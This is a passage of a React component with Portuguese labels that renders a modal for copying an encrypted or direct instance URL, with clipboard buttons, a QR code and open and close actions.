                <div style={{ marginBottom: "14px" }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "6px" }}>
                    <label style={{ fontSize: "12px", fontWeight: 700, color: "#00f0ff", display: "flex", alignItems: "center", gap: "5px" }}>
                      🔒 URL Criptografado da Instância (Recomendado)
                    </label>
                    <span style={{ fontSize: "10px", color: "#64748b" }}>Sem exposição de ID em texto claro</span>
                  </div>
                  <div style={{ display: "flex", gap: "8px" }}>
                    <input
                      type="text"
                      readOnly
                      value={instanceModal.encryptedUrl}
                      style={{
                        flex: 1,
                        background: "#060911",
                        border: "1px solid #1e293b",
                        borderRadius: "8px",
                        padding: "9px 12px",
                        color: "#00f0ff",
                        fontFamily: "var(--font-mono)",
                        fontSize: "12px",
                        outline: "none"
                      }}
                      onClick={(e) => (e.target as HTMLInputElement).select()}
                    />
                    <button
                      type="button"
                      className="primary"
                      onClick={() => {
                        navigator.clipboard.writeText(instanceModal.encryptedUrl);
                        setCopiedKind("enc");
                        showToast("🔒 URL Criptografado copiado!");
                        setTimeout(() => setCopiedKind(null), 2500);
                      }}
                      style={{
                        padding: "0 14px",
                        fontSize: "12px",
                        fontWeight: 700,
                        display: "flex",
                        alignItems: "center",
                        gap: "6px",
                        background: copiedKind === "enc" ? "#22c55e" : undefined,
                        whiteSpace: "nowrap"
                      }}
                    >
                      {copiedKind === "enc" ? <Check size={14} /> : <Copy size={14} />}
                      <span>{copiedKind === "enc" ? "Copiado!" : "Copiar"}</span>
                    </button>
                  </div>
                </div>

                {/* Direct URL field */}
                <div style={{ marginBottom: "18px" }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "6px" }}>
                    <label style={{ fontSize: "12px", fontWeight: 700, color: "#94a3b8", display: "flex", alignItems: "center", gap: "5px" }}>
                      <Link2 size={13} /> Link Direto da Instância
                    </label>
                    <span style={{ fontSize: "10px", color: "#64748b" }}>Parâmetro direto ?instance=...</span>
                  </div>
                  <div style={{ display: "flex", gap: "8px" }}>
                    <input
                      type="text"
                      readOnly
                      value={instanceModal.directUrl}
                      style={{
                        flex: 1,
                        background: "#060911",
                        border: "1px solid #1e293b",
                        borderRadius: "8px",
                        padding: "9px 12px",
                        color: "#cbd5e1",
                        fontFamily: "var(--font-mono)",
                        fontSize: "12px",
                        outline: "none"
                      }}
                      onClick={(e) => (e.target as HTMLInputElement).select()}
                    />
                    <button
                      type="button"
                      className="secondary"
                      onClick={() => {
                        navigator.clipboard.writeText(instanceModal.directUrl);
                        setCopiedKind("dir");
                        showToast("🔗 Link Direto copiado!");
                        setTimeout(() => setCopiedKind(null), 2500);
                      }}
                      style={{
                        padding: "0 14px",
                        fontSize: "12px",
                        fontWeight: 700,
                        display: "flex",
                        alignItems: "center",
                        gap: "6px",
                        background: copiedKind === "dir" ? "rgba(34, 197, 94, 0.2)" : undefined,
                        color: copiedKind === "dir" ? "#22c55e" : undefined,
                        whiteSpace: "nowrap"
                      }}
                    >
                      {copiedKind === "dir" ? <Check size={14} /> : <Copy size={14} />}
                      <span>{copiedKind === "dir" ? "Copiado!" : "Copiar"}</span>
                    </button>
                  </div>
                </div>

                {/* QR Code and Actions Footer */}
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", paddingTop: "14px", borderTop: "1px solid #1e293b" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                    <div style={{ background: "#ffffff", padding: "6px", borderRadius: "8px", display: "inline-flex" }}>
                      <QRCodeSVG value={instanceModal.encryptedUrl} size={64} level="M" />
                    </div>
                    <div>
                      <span style={{ fontSize: "11px", fontWeight: 700, color: "#ffffff", display: "block" }}>
                        Acesso Móvel Rápido
                      </span>
                      <small style={{ fontSize: "10px", color: "#64748b" }}>
                        Escaneie para abrir direto nesta instância
                      </small>
                    </div>
                  </div>

                  <div style={{ display: "flex", gap: "8px" }}>
                    <a
                      href={instanceModal.encryptedUrl}
                      target="_blank"
                      rel="noreferrer"
                      className="secondary compact-btn"
                      style={{
                        display: "inline-flex",
                        alignItems: "center",
                        gap: "6px",
                        padding: "8px 14px",
                        fontSize: "12px",
                        textDecoration: "none",
                        color: "#38bdf8"
                      }}
                    >
                      <ExternalLink size={13} />
                      <span>Abrir em Nova Aba</span>
                    </a>
                    <button
                      type="button"
                      className="primary compact-btn"
                      onClick={() => setInstanceModal(null)}
                      style={{ padding: "8px 16px", fontSize: "12px" }}
                    >
                      Concluir
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
